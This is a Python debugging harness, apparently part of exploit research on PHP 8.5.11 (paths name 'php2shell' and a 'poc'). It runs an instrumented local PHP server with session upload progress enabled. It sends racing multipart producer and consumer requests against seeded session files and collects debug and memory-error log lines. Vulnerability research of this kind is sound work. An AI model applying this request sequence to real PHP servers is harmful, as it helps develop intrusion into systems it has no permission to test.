#!/usr/bin/env python3
"""Run producer/consumer sequences against the instrumented 8.5.11 build and
dump the [DBG] lines from the server log."""
import os
import socket
import subprocess
import sys
import tempfile
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from leak_hunt import (BIG_SESSION, SMALL_SESSION, SID, body, filepart, part,
                       request, seed, split_resp)

PHP = os.path.expanduser(
    "~/workspace/php2shell/poc-109619/build/php-8.5.11/sapi/cli/php")


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def run(label, consumer, seed2="small"):
    root = tempfile.mkdtemp(prefix="dbg-")
    www, sess = os.path.join(root, "www"), os.path.join(root, "sess")
    os.makedirs(www)
    os.makedirs(sess)
    with open(os.path.join(www, "index.php"), "w") as f:
        f.write('<?php echo "ok\\n";\n')
    log_path = os.path.join(root, "server.log")
    log = open(log_path, "wb")
    ini = {
        "memory_limit": "16M",
        "session.save_path": sess,
        "session.upload_progress.enabled": "1",
        "session.upload_progress.cleanup": "1",
        "session.upload_progress.freq": "1%",
        "session.upload_progress.min_freq": "0",
        "session.use_strict_mode": "0",
        "session.use_cookies": "1",
        "session.use_only_cookies": "0",
        "session.cache_limiter": "",
        "display_errors": "0",
        "log_errors": "1",
    }
    args = [PHP]
    for k, v in ini.items():
        args += ["-d", f"{k}={v}"]
    port = free_port()
    args += ["-S", f"127.0.0.1:{port}", "-t", www]
    proc = subprocess.Popen(args, stdout=log, stderr=log)
    try:
        for _ in range(100):
            if proc.poll() is not None:
                break
            try:
                socket.create_connection(("127.0.0.1", port), timeout=0.2).close()
                break
            except OSError:
                time.sleep(0.05)
        seed(sess, BIG_SESSION)
        prod = body(part("PHPSESSID", SID),
                    part("PHP_SESSION_UPLOAD_PROGRESS", "x"), filepart())
        r1 = request(port, prod)
        st1, ck1, _ = split_resp(r1)
        print(f"== {label} == req1: {st1} alive={proc.poll() is None}")
        time.sleep(0.2)
        if seed2 == "small":
            seed(sess, SMALL_SESSION)
        elif seed2 == "none":
            p = os.path.join(sess, "sess_" + SID)
            if os.path.exists(p):
                os.unlink(p)
        r2 = request(port, consumer)
        st2, ck2, _ = split_resp(r2)
        print(f"   req2: {st2} alive={proc.poll() is None}")
        for c in ck2:
            print(f"   req2 cookie ({len(c)}): {c[:100]}")
        time.sleep(0.3)
    finally:
        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(2)
            except subprocess.TimeoutExpired:
                proc.kill()
        log.close()
    with open(log_path, "rb") as f:
        txt = f.read().decode("latin1", "replace")
    print("   --- [DBG] lines ---")
    for ln in txt.splitlines():
        if "[DBG]" in ln or "Allowed memory" in ln:
            print("   " + ln.strip()[:160])
    print()


if __name__ == "__main__":
    c_nofile = body(part("PHPSESSID", SID),
                    part("PHP_SESSION_UPLOAD_PROGRESS", "x"))
    c_std = body(part("PHPSESSID", SID),
                 part("PHP_SESSION_UPLOAD_PROGRESS", "x"), filepart())
    run("C3 nofile consumer", c_nofile)
    run("C1 std consumer", c_std)
